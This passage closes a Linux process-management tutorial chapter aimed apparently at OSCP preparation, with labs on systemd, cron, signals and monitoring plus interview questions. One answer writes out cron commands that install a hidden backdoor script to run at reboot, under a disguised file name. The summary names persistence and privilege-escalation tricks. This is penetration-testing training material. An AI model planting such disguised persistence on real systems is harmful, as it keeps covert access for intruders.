# View jobs
jobs
ps aux | grep sleep

# Kill job
kill %1
```

### Lab 2: Create systemd Service

**Objective**: Create a simple logging service.

```bash
# Create script
cat > /usr/local/bin/logger.sh << 'EOF'
#!/bin/bash
echo "$(date): Service running" >> /tmp/service.log
sleep 60
EOF
chmod +x /usr/local/bin/logger.sh

# Create service
sudo nano /etc/systemd/system/logger.service
```

```ini
[Unit]
Description=Custom Logger

[Service]
ExecStart=/usr/local/bin/logger.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now logger
systemctl status logger
tail -f /tmp/service.log
```

### Lab 3: Cron Job Scheduling

**Objective**: Schedule a task with cron.

```bash
# Edit crontab
crontab -e

# Add job (run every minute)
* * * * * echo "$(date): Cron running" >> /tmp/cron.log

# Wait and check
sleep 70
cat /tmp/cron.log
```

### Lab 4: Signal Handling

**Objective**: Practice sending signals.

```bash
# Start long process
sleep 1000 &
PID=$!

# Pause it
kill -STOP $PID
ps -p $PID  # State: T (stopped)

# Resume it
kill -CONT $PID
ps -p $PID  # State: S (sleeping)

# Terminate politely
kill -TERM $PID

# Force kill if needed
ps -p $PID && kill -9 $PID
```

### Lab 5: Process Monitoring

**Objective**: Find resource-hungry processes.

```bash
# Start CPU-intensive task
yes > /dev/null &
PID=$!

# Monitor
top  # Press 'P' to sort by CPU
ps aux --sort=-%cpu | head
htop  # (if installed)

# Investigate
lsof -p $PID
cat /proc/$PID/cmdline

# Kill it
kill $PID
```

---

## 21. Interview Questions and Answers

### Q1: What happens when you type a command in bash?

**Answer**:
1. Bash calls `fork()` - creates a copy of itself (child process)
2. Child calls `exec()` - replaces itself with the command program
3. Child executes the command
4. Parent bash calls `wait()` - waits for child to finish
5. Child exits, parent resumes, shows prompt

---

### Q2: What's the difference between kill -9 and kill -15?

**Answer**:
- **kill -15 (SIGTERM)**: Polite termination. Process can catch signal, clean up, save data, exit gracefully
- **kill -9 (SIGKILL)**: Forceful kill. Cannot be caught/blocked. Kernel terminates immediately. No cleanup. Last resort.

Best practice: Try kill -15 first, use kill -9 only if process won't die.

---

### Q3: What is a zombie process and how do you remove it?

**Answer**:
A zombie (defunct) process has terminated but parent hasn't read its exit status. Shows as state 'Z' in ps.

**Cannot kill zombie** (already dead). Solutions:
1. Kill parent process (forces parent to clean up)
2. Wait for parent to naturally clean up
3. Reboot (if parent is critical)

Find parent: `ps -o ppid= -p ZOMBIE_PID`

---

### Q4: How do you make a service start automatically on boot?

**Answer**:
```bash
# systemd
sudo systemctl enable service-name

# SysVinit
sudo update-rc.d service-name defaults

# Alternative: Add to rc.local
echo "/path/to/script &" | sudo tee -a /etc/rc.local
```

---

### Q5: Explain the difference between systemd and cron for scheduling.

**Answer**:
**Cron**:
- Simple, traditional
- Time-based only
- Minimal logging
- No dependency management
- Good for simple recurring tasks

**systemd timers**:
- Modern, integrated with systemd
- Time-based + event-based (boot, activation)
- Full journald logging
- Dependency management
- Better error handling
- More complex to set up

---

### Q6: How would you find which process is using a specific port?

**Answer**:
```bash
# Method 1: lsof
lsof -i :80

# Method 2: netstat
netstat -tulpn | grep :80

# Method 3: ss
ss -tulpn | grep :80

# Method 4: fuser
fuser 80/tcp
```

---

### Q7: How do you create persistence via cron for OSCP?

**Answer**:
```bash
# Add to user crontab
crontab -e
@reboot /tmp/.backdoor.sh
*/5 * * * * /tmp/.backdoor.sh  # Run every 5 min

# Or system-wide
echo "*/5 * * * * root /tmp/.backdoor.sh" | sudo tee /etc/cron.d/update
```

Cron job runs with full privileges, survives reboot, re-establishes connection if dropped.

---

### Q8: What is nice value and how do you change it?

**Answer**:
Nice value controls process priority (-20 to +19):
- -20: Highest priority (most CPU)
- 0: Default
- +19: Lowest priority (least CPU)

```bash
# Start with nice value
nice -n 10 command

# Change running process
renice -n 5 -p PID
```

Only root can set negative nice (higher priority).

---

### Q9: How do you debug why a service won't start?

**Answer**:
```bash
# Check status
systemctl status service-name

# View logs
journalctl -u service-name -n 50

# Check config syntax
systemd-analyze verify /etc/systemd/system/service-name.service

# Try manual start
/path/to/executable (from ExecStart)

# Check dependencies
systemctl list-dependencies service-name

# Check file permissions
ls -l /etc/systemd/system/service-name.service
```

---

### Q10: What's the difference between & and nohup?

**Answer**:
- **&**: Runs process in background but attached to terminal. Dies when you logout.
- **nohup**: Runs process immune to hangup signal. Continues after logout.

**Best practice**: Combine them:
```bash
nohup command > output.log 2>&1 &
```

For truly persistent: Use screen, tmux, or systemd service.

---

## 22. Summary and Next Steps

### 22.1 What We Covered

You've learned:
- ✅ Process fundamentals (fork, exec, wait)
- ✅ Process states and lifecycle
- ✅ Process monitoring (ps, top, htop)
- ✅ Signals and process control
- ✅ Job control (background/foreground)
- ✅ systemd service management
- ✅ Creating systemd services
- ✅ Cron job scheduling
- ✅ Process persistence techniques
- ✅ Privilege escalation via cron/services
- ✅ Malware hunting
- ✅ 20+ working examples

### 22.2 Critical Skills for OSCP

**Persistence**:
1. systemd services (auto-restart, boot persistence)
2. Cron jobs (@reboot, recurring)
3. .bashrc injection
4. rc.local modification

**Privilege Escalation**:
1. Writable cron scripts
2. Wildcard injection in cron
3. Weak service permissions
4. PATH hijacking

**Reconnaissance**:
1. ps aux (enumerate running processes)
2. systemctl list-units (enumerate services)
3. crontab -l (check scheduled tasks)
4. lsof (find open files/ports)

### 22.3 Essential Commands

```bash
# Process management
ps aux
top / htop
pgrep / pkill
kill -9 / kill -15

# Service management
systemctl start/stop/restart service
systemctl enable/disable service
systemctl status service

# Cron
crontab -e
crontab -l

# Monitoring
lsof -i :port
netstat -tulpn
journalctl -u service
```

### 22.4 Next Steps

**Practice**:
- Create custom systemd services
- Set up cron jobs for automation
- Practice privilege escalation on vulnerable VMs
- Hunt for persistence mechanisms

**Further Reading**:
- systemd documentation
- cron advanced scheduling
- Linux process internals
- Privilege escalation techniques

**Next Chapter**: File 08 - Linux Logging & Auditing

---

**You now have comprehensive knowledge of Linux process management from fundamentals to advanced exploitation. Master these techniques and process-based OSCP challenges become straightforward.**

---
*End of Chapter 07 - Process Management & Services*
